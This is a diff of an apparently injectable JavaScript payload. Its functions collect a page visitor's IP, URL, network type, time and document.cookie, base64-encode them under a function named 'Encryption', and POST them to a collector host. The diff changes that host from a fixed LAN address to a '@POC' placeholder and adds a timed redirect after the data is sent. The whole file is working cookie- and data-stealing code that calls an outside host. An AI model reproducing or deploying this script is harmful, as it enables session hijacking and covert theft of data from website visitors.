@@ -1,3 +1,4 @@
+var Rd_Path=null;
 var User_Infor = {
     IP:null,
     Host_Type:null,
@@ -89,9 +90,10 @@ function browserRedirect(){
 
 function DATA_Packet(DATA){
     var xhr = new XMLHttpRequest();
-    xhr.open("POST","http://192.168.31.1:1234",true);//Tag
+    xhr.open("POST","@POC",true);//Tag
     xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=utf-8');
     xhr.send(JSON.stringify(DATA));
+    return true;
 }
 function Get_Base_Message(){
     var Info = 
@@ -101,11 +103,20 @@ function Get_Base_Message(){
     User_Infor['Visit_URL']=Encryption(document.URL);
     User_Infor['NetWork']=Encryption(getNetworkType());
     User_Infor['Time']=Encryption(new Date().toLocaleString()); 
-    User_Infor['Cookies']=Encryption(document.cookie) || null
-    DATA_Packet(User_Infor);
+    User_Infor['Cookies']=Encryption(document.cookie) || null;
+    if (DATA_Packet(User_Infor)==true){
+        return true;
+    }
+    else{
+    return false;
+    }
+
 }
 
 function Encryption(DATA){
-    return btoa(DATA)
+    return btoa(DATA);
 }
-Get_Base_Message();
+
+if(Get_Base_Message()==true && Rd_Path != null) {
+setTimeout( Rd_Path,4000);
+}
